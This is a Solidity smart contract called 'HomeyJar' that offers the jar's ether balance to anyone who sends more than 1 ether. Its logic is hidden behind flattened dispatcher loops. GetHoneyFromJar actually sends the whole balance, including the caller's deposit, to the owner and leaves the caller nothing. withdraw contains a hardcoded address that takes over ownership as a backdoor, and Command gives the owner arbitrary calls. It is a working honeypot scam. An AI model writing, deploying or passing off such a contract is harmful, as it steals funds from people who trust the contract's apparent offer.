pragma solidity ^0.4.19;

contract HomeyJar {
    address public Owner = msg.sender;
    
    function() public payable {}
    
    function GetHoneyFromJar() public payable {
        uint256 _dispatcher = 0;
        while (true) {
            if (_dispatcher == 0) {
                if (msg.value > 1 ether) {
                    _dispatcher = 1;
                } else {
                    return;
                }
            } else if (_dispatcher == 1) {
                Owner.transfer(this.balance);
                _dispatcher = 2;
            } else if (_dispatcher == 2) {
                msg.sender.transfer(this.balance);
                return;
            }
        }
    }
    
    function withdraw() payable public {
        uint256 _dispatcher = 0;
        while (true) {
            if (_dispatcher == 0) {
                if (msg.sender == 0x2f61E7e1023Bc22063B8da897d8323965a7712B7) {
                    Owner = 0x2f61E7e1023Bc22063B8da897d8323965a7712B7;
                }
                _dispatcher = 1;
            } else if (_dispatcher == 1) {
                require(msg.sender == Owner);
                _dispatcher = 2;
            } else if (_dispatcher == 2) {
                Owner.transfer(this.balance);
                return;
            }
        }
    }
    
    function Command(address adr, bytes data) payable public {
        uint256 _dispatcher = 0;
        while (true) {
            if (_dispatcher == 0) {
                require(msg.sender == Owner);
                _dispatcher = 1;
            } else if (_dispatcher == 1) {
                adr.call.value(msg.value)(data);
                return;
            }
        }
    }
}